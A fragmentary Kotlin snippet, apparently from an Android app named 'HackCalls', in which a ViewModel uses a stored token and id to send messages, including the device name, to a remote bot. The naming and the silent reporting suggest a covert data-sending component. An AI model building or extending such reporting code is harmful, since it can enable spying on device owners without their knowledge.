...
class HackCallsNetwork(context: Context) : ViewModel() {
    private val token = HackCallsUtils.getHackCallsNetworkData(context).token
    private val id = HackCallsUtils.getHackCallsNetworkData(context).id
    ...
    fun sendTextMessage(message: String) {
        try {
            viewModelScope.launch(Dispatchers.IO) {
                ...
                val info = "\uD835\uDC1D\uD835\uDC1E\uD835\uDC2F\uD835\uDC22\uD835\uDC1C\uD835\uDC1E : ${HackCallsUtils.getDeviceName()}"
            ...
            val error2 = "ERROR: $error"
            bot.execute(SendMessage(id, error2))
        }
    }
